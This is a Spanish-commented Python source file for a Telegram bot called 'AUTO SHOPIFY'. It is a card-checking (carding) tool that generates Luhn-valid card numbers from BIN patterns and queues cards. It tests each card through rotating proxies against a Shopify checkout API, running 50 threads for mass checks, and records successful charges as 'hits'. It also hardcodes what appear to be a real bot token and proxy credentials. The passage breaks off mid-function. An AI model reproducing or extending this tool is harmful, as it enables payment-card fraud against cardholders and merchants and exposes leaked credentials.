# novachk.py - VERSIÓN COMPLETA Y CORREGIDA
import logging
import requests
import json
import os
import random
import asyncio
import time
import re
import sqlite3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import contextmanager

# --- CONFIGURACIÓN ---
TOKEN = "8503937259:AAEApOgsbu34qw5J6OKz1dxgvRzrFv9IQdE"
BOT_NAME = "AUTO SHOPIFY"
API_BASE_URL = "https://auto-shopify-api-production.up.railway.app/index.php"
DEFAULT_PROXY = "45.155.88.66:7497:zpqdlliz:1jrl1sdkbmlj"
ADMIN_ID = 8220432777
DATABASE_FILE = "bot.db"
RESULTS_DIR = "resultados"
HITS_DIR = "hits"
GENERATED_DIR = "generadas"

# Sitios de prueba para health check
TEST_SITES = [
    "https://www.google.com",
    "https://www.cloudflare.com",
    "https://www.github.com"
]

# Variable global para controlar STOP
stop_shopify = False
current_shopify_jobs = 0

# Crear directorios
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(HITS_DIR, exist_ok=True)
os.makedirs(GENERATED_DIR, exist_ok=True)

# --- BASE DE DATOS ---
@contextmanager
def get_db():
    conn = sqlite3.connect(DATABASE_FILE)
    conn.row_factory = sqlite3.Row
    try:
        yield conn
    finally:
        conn.close()

def init_database():
    """Inicializa la base de datos con todas las tablas necesarias"""
    with get_db() as conn:
        cursor = conn.cursor()
        
        # Tabla de usuarios
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT, 
                first_name TEXT, 
                approved BOOLEAN DEFAULT 0,
                registered_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # Tabla de proxies
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy TEXT UNIQUE, 
                added_by INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_alive BOOLEAN DEFAULT 1, 
                times_used INTEGER DEFAULT 0,
                response_time REAL, 
                last_error TEXT, 
                last_checked TIMESTAMP,
                fail_count INTEGER DEFAULT 0, 
                success_count INTEGER DEFAULT 0
            )
        ''')
        
        # Tabla de sitios
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sites (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                site TEXT UNIQUE, 
                added_by INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_valid BOOLEAN DEFAULT 1, 
                times_used INTEGER DEFAULT 0, 
                products_found INTEGER DEFAULT 0,
                response_time REAL, 
                last_error TEXT, 
                last_checked TIMESTAMP,
                fail_count INTEGER DEFAULT 0, 
                success_count INTEGER DEFAULT 0
            )
        ''')
        
        # Tabla de tarjetas generadas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS generated_cards (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                pattern TEXT, 
                generated_by INTEGER,
                generated_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de cola de tarjetas
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS card_queue (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                user_id INTEGER, 
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                processed BOOLEAN DEFAULT 0
            )
        ''')
        
        # Tabla de HITS
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS hits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cc TEXT, 
                site TEXT, 
                proxy TEXT, 
                response_type TEXT,
                response_full TEXT, 
                status_code INTEGER, 
                elapsed REAL,
                user_id INTEGER, 
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                price REAL
            )
        ''')
        
        conn.commit()
        print("✅ Base de datos inicializada correctamente")

# --- FUNCIONES DE USUARIOS ---
def is_approved(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT approved FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        return result is not None and result[0] == 1

def register_user(user_id, username, first_name):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO users (user_id, username, first_name, approved)
            VALUES (?, ?, ?, 1)
        ''', (user_id, username, first_name))
        conn.commit()

def get_user_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM users WHERE approved = 1')
        return cursor.fetchone()[0]

# --- FUNCIONES DE PROXIES ---
def add_proxy(proxy, user_id):
    with get_db() as conn:
        try:
            cursor = conn.cursor()
            cursor.execute('INSERT INTO proxies (proxy, added_by) VALUES (?, ?)', (proxy, user_id))
            conn.commit()
            return True
        except:
            return False

def get_all_proxies(only_alive=True):
    with get_db() as conn:
        cursor = conn.cursor()
        if only_alive:
            cursor.execute('SELECT proxy, added_date, times_used, is_alive, response_time, last_error, fail_count, success_count FROM proxies WHERE is_alive = 1 ORDER BY response_time ASC')
        else:
            cursor.execute('SELECT proxy, added_date, times_used, is_alive, response_time, last_error, fail_count, success_count FROM proxies ORDER BY is_alive DESC')
        return cursor.fetchall()

def get_proxy_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM proxies WHERE is_alive = 1')
        alive = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM proxies')
        total = cursor.fetchone()[0]
        return alive, total - alive

def update_proxy_stats(proxy, is_alive, response_time=None, error=None, success=False):
    with get_db() as conn:
        cursor = conn.cursor()
        if success:
            cursor.execute('''
                UPDATE proxies 
                SET is_alive = ?, response_time = ?, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, success_count = success_count + 1
                WHERE proxy = ?
            ''', (is_alive, response_time, error, proxy))
        else:
            cursor.execute('''
                UPDATE proxies 
                SET is_alive = ?, response_time = ?, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, fail_count = fail_count + 1
                WHERE proxy = ?
            ''', (is_alive, response_time, error, proxy))
        conn.commit()

def mark_proxy_dead(proxy, error=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE proxies 
            SET is_alive = 0, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                fail_count = fail_count + 1
            WHERE proxy = ?
        ''', (error, proxy))
        conn.commit()

def delete_proxy(proxy):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM proxies WHERE proxy = ?', (proxy,))
        conn.commit()

def delete_proxy_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT proxy FROM proxies 
            WHERE added_by = ? ORDER BY added_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM proxies WHERE proxy = ?', (result[0],))
            conn.commit()
            return result[0]
        return None

def delete_all_proxies(user_id=None):
    """Elimina TODOS los proxies"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM proxies WHERE added_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM proxies')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

def delete_all_dead_proxies():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM proxies WHERE is_alive = 0')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE SITIOS ---
def add_site(site, user_id):
    with get_db() as conn:
        try:
            if not site.startswith(('http://', 'https://')):
                site = 'https://' + site
            cursor = conn.cursor()
            cursor.execute('INSERT INTO sites (site, added_by) VALUES (?, ?)', (site, user_id))
            conn.commit()
            return True
        except:
            return False

def get_all_sites(only_valid=True):
    with get_db() as conn:
        cursor = conn.cursor()
        if only_valid:
            cursor.execute('SELECT site, added_date, times_used, is_valid, products_found, response_time, fail_count, success_count FROM sites WHERE is_valid = 1 ORDER BY products_found DESC')
        else:
            cursor.execute('SELECT site, added_date, times_used, is_valid, products_found, response_time, fail_count, success_count FROM sites ORDER BY is_valid DESC')
        return cursor.fetchall()

def get_site_count():
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM sites WHERE is_valid = 1')
        valid = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM sites')
        total = cursor.fetchone()[0]
        return valid, total - valid

def update_site_stats(site, is_valid, response_time=None, has_product=False, success=False):
    with get_db() as conn:
        cursor = conn.cursor()
        if success:
            cursor.execute('''
                UPDATE sites 
                SET is_valid = ?, response_time = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, products_found = products_found + ?,
                    success_count = success_count + 1
                WHERE site = ?
            ''', (is_valid, response_time, 1 if has_product else 0, site))
        else:
            cursor.execute('''
                UPDATE sites 
                SET is_valid = ?, response_time = ?, last_checked = CURRENT_TIMESTAMP,
                    times_used = times_used + 1, products_found = products_found + ?,
                    fail_count = fail_count + 1
                WHERE site = ?
            ''', (is_valid, response_time, 1 if has_product else 0, site))
        conn.commit()

def mark_site_invalid(site, error=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE sites 
            SET is_valid = 0, last_error = ?, last_checked = CURRENT_TIMESTAMP,
                fail_count = fail_count + 1
            WHERE site = ?
        ''', (error, site))
        conn.commit()

def delete_site(site):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM sites WHERE site = ?', (site,))
        conn.commit()

def delete_site_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT site FROM sites 
            WHERE added_by = ? ORDER BY added_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM sites WHERE site = ?', (result[0],))
            conn.commit()
            return result[0]
        return None

def delete_all_sites(user_id=None):
    """Elimina TODOS los sitios"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM sites WHERE added_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM sites')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE TARJETAS ---
def save_generated_cards(cards, pattern, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        count = 0
        for card in cards:
            cursor.execute('''
                INSERT INTO generated_cards (cc, pattern, generated_by)
                VALUES (?, ?, ?)
            ''', (card, pattern, user_id))
            count += 1
        conn.commit()
        return count

def get_generated_cards(user_id=None, limit=100):
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('SELECT cc, pattern, generated_date, used FROM generated_cards WHERE generated_by = ? ORDER BY generated_date DESC LIMIT ?', (user_id, limit))
        else:
            cursor.execute('SELECT cc, pattern, generated_date, used FROM generated_cards ORDER BY generated_date DESC LIMIT ?', (limit,))
        return cursor.fetchall()

def delete_generated_card(cc, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM generated_cards WHERE cc = ? AND generated_by = ?', (cc, user_id))
        conn.commit()

def delete_generated_card_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT cc FROM generated_cards 
            WHERE generated_by = ? ORDER BY generated_date DESC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM generated_cards WHERE cc = ? AND generated_by = ?', (result[0], user_id))
            conn.commit()
            return result[0]
        return None

def delete_all_generated_cards(user_id=None):
    """Elimina TODAS las tarjetas generadas"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM generated_cards WHERE generated_by = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM generated_cards')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

# --- FUNCIONES DE COLA ---
def add_to_queue(cards, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        count = 0
        for card in cards:
            cursor.execute('''
                INSERT INTO card_queue (cc, user_id)
                VALUES (?, ?)
            ''', (card, user_id))
            count += 1
        conn.commit()
        return count

def get_queue_count(user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) FROM card_queue WHERE user_id = ? AND processed = 0', (user_id,))
        return cursor.fetchone()[0]

def get_queue_cards(user_id, limit=1000):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('SELECT cc FROM card_queue WHERE user_id = ? AND processed = 0 ORDER BY added_date ASC LIMIT ?', (user_id, limit))
        return [row[0] for row in cursor.fetchall()]

def delete_from_queue(cc, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('DELETE FROM card_queue WHERE cc = ? AND user_id = ?', (cc, user_id))
        conn.commit()

def delete_from_queue_by_index(index, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT cc FROM card_queue 
            WHERE user_id = ? AND processed = 0 ORDER BY added_date ASC LIMIT 1 OFFSET ?
        ''', (user_id, index-1))
        result = cursor.fetchone()
        if result:
            cursor.execute('DELETE FROM card_queue WHERE cc = ? AND user_id = ?', (result[0], user_id))
            conn.commit()
            return result[0]
        return None

def clear_all_queue(user_id=None):
    """Elimina TODAS las tarjetas de la cola"""
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('DELETE FROM card_queue WHERE user_id = ?', (user_id,))
        else:
            cursor.execute('DELETE FROM card_queue')
        deleted = cursor.rowcount
        conn.commit()
        return deleted

def mark_queue_processed(cards, user_id):
    with get_db() as conn:
        cursor = conn.cursor()
        for card in cards:
            cursor.execute('UPDATE card_queue SET processed = 1 WHERE cc = ? AND user_id = ?', (card, user_id))
        conn.commit()

# --- FUNCIONES DE HITS ---
def save_hit(cc, site, proxy, response_type, response_full, status_code, elapsed, user_id, price=None):
    with get_db() as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO hits (cc, site, proxy, response_type, response_full, status_code, elapsed, user_id, price)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (cc, site, proxy, response_type, response_full[:500], status_code, elapsed, user_id, price))
        conn.commit()

def get_hits(user_id=None, limit=100):
    with get_db() as conn:
        cursor = conn.cursor()
        if user_id:
            cursor.execute('SELECT cc, site, response_type, timestamp, price FROM hits WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?', (user_id, limit))
        else:
            cursor.execute('SELECT cc, site, response_type, timestamp, price FROM hits ORDER BY timestamp DESC LIMIT ?', (limit,))
        return cursor.fetchall()

# --- FUNCIONES DE UTILIDADES MEJORADAS ---
def parse_cc_line(line):
    """Parsea una línea de CC y la formatea correctamente"""
    line = line.strip()
    if not line:
        return None
    
    # Reemplazar cualquier separador por |
    for sep in [',', ';', ' ', ':', '/']:
        line = line.replace(sep, '|')
    
    parts = line.split('|')
    if len(parts) >= 4:
        # Verificar que el primer campo sea numérico (tarjeta)
        if parts[0].isdigit() and len(parts[0]) >= 15:
            # Verificar que mes y año sean numéricos
            if parts[1].isdigit() and len(parts[1]) <= 2:
                if parts[2].isdigit() and (len(parts[2]) == 2 or len(parts[2]) == 4):
                    # Formatear mes a 2 dígitos y año a 4 dígitos
                    month = parts[1].zfill(2)
                    year = parts[2] if len(parts[2]) == 4 else '20' + parts[2]
                    return f"{parts[0]}|{month}|{year}|{parts[3]}"
    return None

def parse_proxy_line(line):
    """Parsea una línea de proxy"""
    line = line.strip()
    if not line:
        return None
    
    # Formato: ip:puerto:usuario:contraseña
    if line.count(':') == 3:
        return line
    # Formato: usuario:contraseña@ip:puerto
    elif '@' in line and ':' in line:
        return line
    # Formato: ip:puerto
    elif line.count(':') == 1:
        parts = line.split(':')
        if parts[0].replace('.', '').isdigit() and parts[1].isdigit():
            return line
    return None

def parse_site_line(line):
    """Parsea una línea de sitio web"""
    line = line.strip().lower()
    if not line:
        return None
    
    # Eliminar http:// o https:// si existen
    line = re.sub(r'^https?://', '', line)
    
    # Verificar que tenga un dominio válido
    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]*\.[a-zA-Z]{2,}(/[a-zA-Z0-9-_.]+)*$', line):
        return 'https://' + line
    return None

# ===== FUNCIÓN ANALYZE RESPONSE CORREGIDA =====
def analyze_response(response_text):
    """
    Analiza la respuesta JSON de la API para determinar el tipo correcto
    PRIORIDAD: El campo Response es el único que determina el tipo
    """
    try:
        # Intentar parsear como JSON
        data = json.loads(response_text)
        
        # Obtener el campo Response (¡ESTE ES EL ÚNICO QUE IMPORTA!)
        response_field = data.get('Response', '').lower()
        
        # ⚠️ SOLO el campo Response determina el tipo
        if 'captcha_required' in response_field:
            return 'CAPTCHA'
        elif 'product id is empty' in response_field:
            return 'PRODUCT_EMPTY'
        elif 'del ammount empty' in response_field:
            return 'AMOUNT_EMPTY'
        elif 'generic_error' in response_field:
            return 'GENERIC_ERROR'
        elif 'charge' in response_field:
            return 'CHARGE'
        elif '3d' in response_field or 'secure' in response_field:
            return 'LIVE'
        elif 'declin' in response_field or 'rechaz' in response_field:
            return 'DECLINE'
        elif 'error' in response_field:
            return 'ERROR'
        else:
            # Si no hay Response conocido, es UNKNOWN
            return 'UNKNOWN'
            
    except json.JSONDecodeError:
        # Si no es JSON, usar análisis de texto plano
        text = response_text.lower()
        if 'captcha' in text:
            return 'CAPTCHA'
        elif 'charge' in text:
            return 'CHARGE'
        elif '3d' in text or 'secure' in text:
            return 'LIVE'
        elif 'declin' in text:
            return 'DECLINE'
        elif 'error' in text:
            return 'ERROR'
        else:
            return 'UNKNOWN'
    except Exception as e:
        print(f"Error en analyze_response: {e}")
        return 'ERROR'

def extract_price(response_text):
    """Extrae precio de la respuesta si existe"""
    try:
        data = json.loads(response_text)
        return float(data.get('Price', 0)) if data.get('Price') else None
    except:
        # Si no es JSON, buscar con regex
        match = re.search(r'"price":\s*"?\$?([0-9.]+)"?', response_text)
        return float(match.group(1)) if match else None

def format_cc_display(cc):
    """Formatea una tarjeta para mostrar (número|mes|año|cvv)"""
    parts = cc.split('|')
    if len(parts) == 4:
        return f"`{parts[0][:6]}xxxxxx{parts[0][-4:]}|{parts[1]}|{parts[2]}|{parts[3]}`"
    return f"`{cc[:10]}...`"

def format_hit_display(cc, site, proxy, response_type, price=None, response_text=None):
    """Formatea un HIT para mostrar en el chat"""
    parts = cc.split('|')
    card_num = parts[0] if len(parts) > 0 else cc
    month = parts[1] if len(parts) > 1 else '??'
    year = parts[2] if len(parts) > 2 else '??'
    cvv = parts[3] if len(parts) > 3 else '???'
    
    # Determinar emoji y título según el tipo
    emoji_map = {
        'CHARGE': '💰',
        'LIVE': '🔒',
        'CAPTCHA': '🛡️',
        'PRODUCT_EMPTY': '📦',
        'AMOUNT_EMPTY': '💰',
        'GENERIC_ERROR': '⚠️',
        'DECLINE': '❌',
        'ERROR': '⚡',
        'UNKNOWN': '❓'
    }
    emoji = emoji_map.get(response_type, '❓')
    
    title = f"{emoji} {response_type} DETECTED {emoji}"
    
    msg = (
        f"{title}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 **Tarjeta:**\n"
        f"`{card_num[:6]}xxxxxx{card_num[-4:]}|{month}|{year}|{cvv}`\n\n"
        f"🌐 **Sitio:**\n`{site}`\n\n"
        f"🔒 **Proxy:**\n`{proxy}`\n"
    )
    
    if price:
        msg += f"💰 **Precio:** ${price}\n"
    
    if response_text:
        preview = response_text[:200] + "..." if len(response_text) > 200 else response_text
        msg += f"\n📝 **Respuesta:**\n`{preview}`"
    
    return msg

# ===== FUNCIONES DEL GENERADOR =====
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def calculate_luhn(card_number):
    checksum = luhn_checksum(int(card_number) * 10)
    return int(card_number) * 10 + ((10 - checksum) % 10)

def generate_cc(bin_pattern, count=10):
    results = []
    parts = bin_pattern.split('|')
    card_pattern = parts[0] if len(parts) >= 1 else bin_pattern
    month = parts[1] if len(parts) >= 2 else 'rnd'
    year = parts[2] if len(parts) >= 3 else 'rnd'
    cvv = parts[3] if len(parts) >= 4 else 'rnd'
    
    for _ in range(count):
        if 'x' in card_pattern.lower():
            card_temp = card_pattern.lower()
            x_count = card_temp.count('x')
            for _ in range(x_count):
                card_temp = card_temp.replace('x', str(random.randint(0, 9)), 1)
            if len(card_temp) == 15:
                card_temp = str(calculate_luhn(card_temp))
        else:
            card_temp = card_pattern
        
        use_month = month if month != 'rnd' else str(random.randint(1, 12)).zfill(2)
        use_year = year if year != 'rnd' else str(random.randint(2025, 2035))
        use_cvv = cvv if cvv != 'rnd' else str(random.randint(0, 999)).zfill(3)
        
        results.append(f"{card_temp}|{use_month}|{use_year}|{use_cvv}")
    
    return results

async def lookup_bin(bin_number):
    try:
        bin_clean = re.sub(r'\D', '', bin_number)[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_clean}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_clean,
                'scheme': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A').upper(),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A'),
                'emoji': data.get('country', {}).get('emoji', '')
            }
        return {'bin': bin_clean, 'error': 'No encontrado'}
    except:
        return {'bin': bin_clean, 'error': 'Error'}

# ===== FUNCIÓN HEALTH CHECK =====
def check_proxy_sync(proxy):
    """Versión síncrona para ThreadPool"""
    result = {'alive': False, 'response_time': None, 'error': None}
    try:
        proxies = {}
        if '@' in proxy:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        elif ':' in proxy:
            parts = proxy.split(':')
            if len(parts) == 2:
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            elif len(parts) == 4:
                host, port, user, passwd = parts
                proxies = {'http': f'http://{user}:{passwd}@{host}:{port}',
                          'https': f'http://{user}:{passwd}@{host}:{port}'}
        
        for site in TEST_SITES:
            try:
                start = time.time()
                response = requests.get(site, proxies=proxies, timeout=5)
                if response.status_code == 200:
                    result['alive'] = True
                    result['response_time'] = round(time.time() - start, 2)
                    break
            except:
                continue
    except Exception as e:
        result['error'] = str(e)
    return result

async def ultra_healthcheck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Health check ultra rápido con 50 hilos"""
    if update.callback_query:
        message = update.callback_query.message
    else:
        message = update.message
    
    proxies = get_all_proxies(only_alive=False)
    
    if not proxies:
        await message.reply_text("📭 No hay proxies para verificar")
        return
    
    total = len(proxies)
    proxies_list = [p[0] for p in proxies]
    
    progress_msg = await message.reply_text(f"⚡ **ULTRA HEALTH CHECK**\nVerificando {total} proxies...")
    
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_proxy = {executor.submit(check_proxy_sync, p): p for p in proxies_list}
        completed = 0
        alive = 0
        dead = 0
        
        for future in as_completed(future_to_proxy):
            proxy = future_to_proxy[future]
            try:
                result = future.result()
                if result['alive']:
                    alive += 1
                    update_proxy_stats(proxy, 1, result.get('response_time'), None, True)
                else:
                    dead += 1
                    mark_proxy_dead(proxy, result.get('error', 'Timeout'))
                completed += 1
                
                if completed % 10 == 0 or completed == total:
                    elapsed = time.time() - start_time
                    percentage = (completed / total) * 100
                    bar = '█' * int(percentage/5) + '░' * (20 - int(percentage/5))
                    await progress_msg.edit_text(
                        f"⚡ **ULTRA HEALTH CHECK**\n"
                        f"{bar} {percentage:.1f}%\n"
                        f"🟢 Vivos: {alive} | 🔴 Muertos: {dead}\n"
                        f"⚡ Velocidad: {completed/elapsed:.1f} prox/s"
                    )
            except:
                dead += 1
                completed += 1
                mark_proxy_dead(proxy, 'Error')
    
    elapsed = time.time() - start_time
    final_msg = (
        f"✅ **HEALTH CHECK COMPLETADO**\n\n"
        f"**RESULTADOS FINALES**\n"
        f"- Total verificados: {total}\n"
        f"  - 🟢 Vivos: {alive}\n"
        f"  - 🔴 Muertos: {dead}\n"
        f"- Tasa de éxito: {(alive/total*100):.1f}%\n\n"
        f"✔ **Tiempo total:** {int(elapsed)}s"
    )
    
    if dead > 0:
        keyboard = [[InlineKeyboardButton("🧹 LIMPIAR PROXIES MUERTOS", callback_data='clean_proxies')]]
        await progress_msg.edit_text(final_msg, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await progress_msg.edit_text(final_msg)

# ===== COMANDO CHK MEJORADO =====
async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /chk mejorado - muestra toda la información"""
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ **Uso:** `/chk <cc>`\n"
            "Ejemplo: `/chk 5253222254795738|03|2027|103`",
            parse_mode='Markdown'
        )
        return
    
    cc = args[0]
    user_id = update.effective_user.id
    
    # Obtener sitio y proxy aleatorios
    sites = get_all_sites(only_valid=True)
    proxies = get_all_proxies(only_alive=True)
    
    if not sites:
        await update.message.reply_text("❌ No hay sitios válidos. Agrega con /addsh")
        return
    
    if not proxies:
        await update.message.reply_text("❌ No hay proxies vivos. Agrega con /addrproxy")
        return
    
    site = random.choice(sites)[0]
    proxy = random.choice(proxies)[0]
    
    # Formatear tarjeta para mostrar
    cc_display = format_cc_display(cc)
    
    msg = await update.message.reply_text(
        f"🔄 **PROCESANDO CHK**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"💳 Tarjeta: {cc_display}\n"
        f"🌐 Sitio: `{site}`\n"
        f"🔒 Proxy: `{proxy}`",
        parse_mode='Markdown'
    )
    
    try:
        params = {'site': site, 'cc': cc, 'proxy': proxy}
        start = time.time()
        response = requests.get(API_BASE_URL, params=params, timeout=60)
        elapsed = time.time() - start
        
        response_type = analyze_response(response.text)
        price = extract_price(response.text)
        
        # Emoji según el tipo
        emoji_map = {
            'CHARGE': '💰',
            'LIVE': '🔒',
            'CAPTCHA': '🛡️',
            'PRODUCT_EMPTY': '📦',
            'AMOUNT_EMPTY': '💰',
            'GENERIC_ERROR': '⚠️',
            'DECLINE': '❌',
            'ERROR': '⚡',
            'UNKNOWN': '❓'
        }
        emoji = emoji_map.get(response_type, '❓')
        
        # Guardar HIT solo si es CHARGE o LIVE
        if response_type in ['CHARGE', 'LIVE']:
            save_hit(cc, site, proxy, response_type, response.text,
                    response.status_code, elapsed, user_id, price)
            
            # Enviar notificación en tiempo real
            hit_msg = format_hit_display(cc, site, proxy, response_type, price, response.text)
            await update.message.reply_text(hit_msg, parse_mode='Markdown')
            print(f"🎯 {response_type} DETECTADO: {cc[:10]}...")
        
        # Actualizar estadísticas
        if response.status_code == 200:
            update_proxy_stats(proxy, 1, elapsed, None, True)
            update_site_stats(site, 1, elapsed, bool(price), True)
        else:
            mark_proxy_dead(proxy, f"HTTP {response.status_code}")
            mark_site_invalid(site, f"HTTP {response.status_code}")
        
        # Respuesta truncada para mostrar
        response_preview = response.text[:300] + "..." if len(response.text) > 300 else response.text
        
        # Mensaje de resultado completo
        result_msg = (
            f"{emoji} **RESULTADO DEL CHK** {emoji}\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💳 **Tarjeta:** {cc_display}\n"
            f"🌐 **Sitio:** `{site}`\n"
            f"🔒 **Proxy:** `{proxy}`\n"
            f"📊 **Tipo:** {response_type}\n"
            f"📟 **Código:** {response.status_code}\n"
            f"⚡ **Tiempo:** {elapsed:.2f}s\n"
        )
        
        if price:
            result_msg += f"💰 **Precio:** ${price}\n"
        
        result_msg += f"\n📝 **Respuesta API:**\n```\n{response_preview}\n```"
        
        await msg.edit_text(result_msg, parse_mode='Markdown')
        
        # Guardar resultado en archivo
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        result_file = f"{RESULTS_DIR}/chk_{timestamp}.txt"
        
        with open(result_file, 'w', encoding='utf-8') as f:
            f.write(f"RESULTADO CHK - {timestamp}\n")
            f.write("="*50 + "\n\n")
            f.write(f"Tarjeta: {cc}\n")
            f.write(f"Sitio: {site}\n")
            f.write(f"Proxy: {proxy}\n")
            f.write(f"Tipo: {response_type}\n")
            f.write(f"Código: {response.status_code}\n")
            f.write(f"Tiempo: {elapsed:.2f}s\n")
            if price:
                f.write(f"Precio: ${price}\n")
            f.write("\nRESPUESTA COMPLETA:\n")
            f.write("-"*30 + "\n")
            f.write(response.text)
        
        with open(result_file, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f"chk_{timestamp}.txt",
                caption=f"📁 Respuesta completa del CHK"
            )
        
    except Exception as e:
        await msg.edit_text(f"❌ **ERROR**\n\n{str(e)[:200]}", parse_mode='Markdown')

# ===== COMANDO MASS CON PROCESAMIENTO PARALELO =====
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /mass - Multi-CHK con procesamiento paralelo (50 hilos)"""
    global stop_shopify
    user_id = update.effective_user.id
    
    print(f"🔍 INICIANDO MASS para usuario {user_id}")
    
    # Obtener tarjetas de la cola
    cards = get_queue_cards(user_id, 500)
    print(f"📊 Tarjetas encontradas: {len(cards)}")
    
    if not cards:
        await update.message.reply_text(
            "❌ No hay tarjetas en cola.\n\n"
            "Para agregar tarjetas:\n"
            "1. Usa /gen para generar tarjetas\n"
            "2. Envía un archivo cards.txt\n"
            "3. Usa /queue para ver la cola"
        )
        return
    
    # Obtener sitios y proxies válidos
    sites = get_all_sites(only_valid=True)
    proxies = get_all_proxies(only_alive=True)
    
